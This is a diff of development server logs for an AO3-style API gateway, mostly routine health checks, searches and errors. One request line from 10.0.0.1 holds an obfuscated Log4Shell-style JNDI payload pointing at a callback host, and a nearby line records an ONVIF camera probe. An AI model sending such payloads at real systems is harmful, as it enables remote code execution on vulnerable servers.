@@ -1,7 +1,6 @@
-2025/10/10 22:09:59 No .env file found, using system environment variables
-2025/10/10 22:09:59 🔧 Initializing Nuclear AO3 API Gateway...
-2025/10/10 22:09:59 ✅ Redis connected successfully
-2025/10/10 22:09:59 ✅ API Gateway initialized successfully
+2025/10/13 17:08:14 🔧 Initializing Nuclear AO3 API Gateway...
+2025/10/13 17:08:14 ✅ Redis connected successfully
+2025/10/13 17:08:14 ✅ API Gateway initialized successfully
 [GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
  - using env:	export GIN_MODE=release
  - using code:	gin.SetMode(gin.ReleaseMode)
@@ -111,22 +110,144 @@
 [GIN-debug] DELETE /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (7 handlers)
 [GIN-debug] CONNECT /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (7 handlers)
 [GIN-debug] TRACE  /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (7 handlers)
-2025/10/10 22:09:59 🚀 Nuclear AO3 API Gateway starting on port 8080
-2025/10/10 22:09:59 📊 GraphQL Playground: http://localhost:8080/graphql
-2025/10/10 22:09:59 📈 Metrics: http://localhost:8080/metrics
-2025/10/10 22:09:59 ⚠️ Health check failed for auth-service: Get "http://localhost:8081/health": dial tcp [::1]:8081: connect: connection refused
-2025/10/10 22:09:59 ⚠️ Health check failed for tag-service: Get "http://localhost:8083/health": dial tcp [::1]:8083: connect: connection refused
-2025/10/10 22:09:59 ⚠️ Health check failed for work-service: Get "http://localhost:8082/health": dial tcp [::1]:8082: connect: connection refused
-2025/10/10 22:09:59 ⚠️ Health check failed for search-service: Get "http://localhost:8084/health": dial tcp [::1]:8084: connect: connection refused
-2025/10/10 22:10:06 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:10:06 | 503 |     242.333µs |             ::1 | GET     "/health"
-2025/10/10 22:10:42 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:10:42 | 503 |      46.167µs |             ::1 | GET     "/health"
-2025/10/10 22:14:33 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:14:33 | 200 |    4.027875ms |             ::1 | POST    "/graphql"
-2025/10/10 22:14:44 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:14:44 | 200 |    1.188917ms |             ::1 | POST    "/graphql"
-2025/10/10 22:14:49 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:14:49 | 200 |      1.2495ms |             ::1 | POST    "/graphql"
-2025/10/10 22:15:38 CORS: Origin  not in allowed list
-[GATEWAY] 2025/10/10 - 22:15:38 | 200 |    1.456583ms |             ::1 | POST    "/graphql"
+2025/10/13 17:08:14 🚀 Nuclear AO3 API Gateway starting on port 8080
+2025/10/13 17:08:14 📊 GraphQL Playground: http://localhost:8080/graphql
+2025/10/13 17:08:14 📈 Metrics: http://localhost:8080/metrics
+2025/10/13 17:08:14 ✅ work-service is healthy (response time: 2.533791ms)
+2025/10/13 17:08:14 ✅ tag-service is healthy (response time: 3.927125ms)
+2025/10/13 17:08:14 ✅ auth-service is healthy (response time: 4.801458ms)
+2025/10/13 17:08:14 ✅ search-service is healthy (response time: 9.734625ms)
+[GATEWAY] 2025/10/13 - 17:08:17 | 200 |      118.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:08:23 | 200 |      28.125µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:08:51 | 200 |      24.666µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:09:12 | 200 |      71.042µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:09:38 | 404 |      31.166µs |             ::1 | POST    "/api/auth/login"
+[GATEWAY] 2025/10/13 - 17:09:42 | 404 |        17.5µs |             ::1 | POST    "/api/auth/register"
+[GATEWAY] 2025/10/13 - 17:09:47 | 200 |          32µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:10:46 | 200 |      103.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:12:04 | 200 |     111.875µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:14:24 | 200 |      76.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:30:16 | 404 |     105.125µs |        10.0.0.1 | POST    "/onvif/device_service"
+[GATEWAY] 2025/10/13 - 17:30:26 | 404 |       179.5µs |        10.0.0.1 | GET     "/"
+[GATEWAY] 2025/10/13 - 17:30:28 | 404 |          44µs |        10.0.0.1 | GET     "/${${lower:j}${env:TEST:-n}di${::-:}${::-d}n${lower:s}://10.0.0.1:34393/ZVFBuOXUlTHFYKzWNscXvaHzMHnBCfJY}"
+[GATEWAY] 2025/10/13 - 17:30:38 | 404 |      64.917µs |        10.0.0.1 | POST    "/"
+[GATEWAY] 2025/10/13 - 17:42:05 | 200 |     100.709µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:08 | 200 |      75.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:10 | 200 |      42.125µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:17 | 200 |     40.1675ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 17:42:17 | 500 |    7.078667ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 17:42:20 | 200 |      19.375µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:20 | 200 |   11.388042ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 17:42:20 | 500 |    4.230667ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 17:42:30 | 200 |        96.5µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:39 | 200 |   37.543666ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 17:42:39 | 500 |   13.087041ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 17:42:40 | 200 |     130.667µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:42:50 | 200 |     157.917µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:44:24 | 200 |   21.273125ms |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:44:34 | 200 |     125.833µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:44:44 | 200 |     224.666µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:44:54 | 200 |      58.916µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:45:02 | 200 |      68.542µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:45:04 | 200 |      71.125µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:45:15 | 200 |      87.958µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:46:13 | 200 |         101µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:46:23 | 200 |      36.459µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:46:33 | 200 |      26.167µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:46:43 | 200 |      40.209µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:46:53 | 200 |      42.084µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:03 | 200 |      20.542µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:13 | 200 |      18.209µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:23 | 200 |      47.042µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:33 | 200 |      49.541µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:43 | 200 |     120.208µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:47:46 | 500 |    3.507958ms |             ::1 | GET     "/api/v1/works/?limit=5&page=1"
+[GATEWAY] 2025/10/13 - 17:47:53 | 200 |      20.166µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:03 | 200 |      36.667µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:13 | 200 |     321.667µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:23 | 200 |     107.167µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:33 | 200 |      66.083µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:43 | 200 |      19.417µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:48:53 | 200 |     751.208µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:49:03 | 200 |      38.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:49:58 | 200 |     905.083µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:01 | 500 |    8.475959ms |             ::1 | GET     "/api/v1/works/?limit=3&page=1"
+[GATEWAY] 2025/10/13 - 17:50:08 | 200 |      41.292µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:15 | 200 |     186.583µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:25 | 200 |      88.666µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:35 | 200 |      27.042µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:45 | 200 |      28.708µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:46 | 200 |   56.124167ms |             ::1 | GET     "/api/v1/tags/search?q=Ag&limit=10"
+[GATEWAY] 2025/10/13 - 17:50:49 | 200 |    4.251666ms |             ::1 | GET     "/api/v1/tags/search?q=Aga&limit=10"
+[GATEWAY] 2025/10/13 - 17:50:53 | 200 |     2.84325ms |             ::1 | GET     "/api/v1/tags/search?q=Agat&limit=10"
+[GATEWAY] 2025/10/13 - 17:50:55 | 200 |      50.792µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:50:57 | 200 |      6.5505ms |             ::1 | GET     "/api/v1/tags/search?q=Agath&limit=10"
+[GATEWAY] 2025/10/13 - 17:51:03 | 200 |     5.95675ms |             ::1 | GET     "/api/v1/tags/search?q=Agatha&limit=10"
+[GATEWAY] 2025/10/13 - 17:51:05 | 200 |       34.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:51:10 | 200 |    5.599667ms |             ::1 | GET     "/api/v1/tags/search?q=Agathaa&limit=10"
+[GATEWAY] 2025/10/13 - 17:51:12 | 200 |    4.744708ms |             ::1 | GET     "/api/v1/tags/search?q=Agathaaa&limit=10"
+[GATEWAY] 2025/10/13 - 17:51:15 | 200 |      19.416µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:51:25 | 200 |     117.916µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:51:35 | 200 |      46.375µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:51:45 | 200 |      56.084µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:52:46 | 200 |   23.319833ms |             ::1 | GET     "/api/v1/works/?limit=3&page=1"
+[GATEWAY] 2025/10/13 - 17:53:55 | 200 |      443.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:53:58 | 200 |       54.75µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:54:08 | 200 |      64.125µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:54:09 | 200 |   11.147875ms |             ::1 | GET     "/api/v1/tags/search?q=A%3D&limit=10"
+[GATEWAY] 2025/10/13 - 17:54:18 | 200 |      24.375µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:54:28 | 200 |      85.541µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:54:43 | 200 |      52.334µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:54:46 | 200 |   41.528667ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 17:54:46 | 200 |   24.404125ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 17:54:53 | 200 |      22.167µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:55:03 | 200 |     187.292µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:55:13 | 200 |      176.75µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:55:23 | 200 |       26.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:55:33 | 200 |      268.25µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:55:43 | 200 |      41.833µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 17:58:26 | 200 |     212.083µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:01:58 | 200 |     122.542µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:16:51 | 200 |     257.792µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:16:53 | 200 |   26.948458ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 18:16:53 | 200 |   37.697833ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 18:17:01 | 200 |      25.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:17:11 | 200 |        39.5µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:17:21 | 200 |      37.209µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:17:31 | 200 |      26.333µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:17:37 | 200 |    16.81825ms |             ::1 | GET     "/api/v1/tags/search?q=Ag&limit=10"
+[GATEWAY] 2025/10/13 - 18:17:41 | 200 |      23.208µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:17:51 | 200 |        28.5µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:18:02 | 200 |      18.917µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:18:13 | 200 |      19.041µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:18:43 | 200 |     120.416µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:18:43 | 200 |   43.480583ms |             ::1 | GET     "/api/v1/works/?sort=updated_at&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 18:18:48 | 200 |      76.792µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:18:52 | 200 |   41.787375ms |             ::1 | GET     "/api/v1/works/?sort=updated_at&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 18:18:52 | 200 |   58.445666ms |             ::1 | GET     "/api/v1/works/?sort=updated_at&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 18:18:56 | 200 |     26.4155ms |             ::1 | GET     "/api/v1/search/works?q=test&page=1&limit=20"
+[GATEWAY] 2025/10/13 - 18:18:56 | 200 |   24.263583ms |             ::1 | GET     "/api/v1/works/?limit=20&page=1"
+[GATEWAY] 2025/10/13 - 18:18:58 | 200 |      22.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:08 | 200 |      27.041µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:18 | 200 |      28.833µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:28 | 200 |      20.292µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:38 | 200 |      27.375µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:48 | 200 |      50.667µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:19:52 | 500 |   10.043334ms |             ::1 | POST    "/api/v1/works/"
+[GATEWAY] 2025/10/13 - 18:19:58 | 200 |      19.625µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:20:01 | 500 |   29.743333ms |             ::1 | POST    "/api/v1/works/"
+[GATEWAY] 2025/10/13 - 18:20:08 | 200 |      32.167µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:20:18 | 200 |     113.833µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:20:31 | 200 |      94.916µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:20:38 | 401 |    2.487875ms |             ::1 | POST    "/api/v1/works/"
+[GIN-debug] redirecting request 307: /api/v1/works/ --> /api/v1/works/
+[GATEWAY] 2025/10/13 - 18:20:53 | 200 |      79.584µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:21:15 | 401 |    2.100041ms |             ::1 | POST    "/api/v1/works/"
+[GATEWAY] 2025/10/13 - 18:21:29 | 200 |     382.125µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:22:15 | 200 |     340.959µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:23:25 | 200 |     149.958µs |             ::1 | GET     "/health"
+[GATEWAY] 2025/10/13 - 18:23:34 | 200 |          52µs |             ::1 | GET     "/health"
+[GIN-debug] redirecting request 307: /api/v1/works/ --> /api/v1/works/
+[GIN-debug] redirecting request 307: /api/v1/works/ --> /api/v1/works/
+2025/10/13 18:24:15 🛑 Shutting down API Gateway...
+2025/10/13 18:24:15 ✅ API Gateway exited cleanly
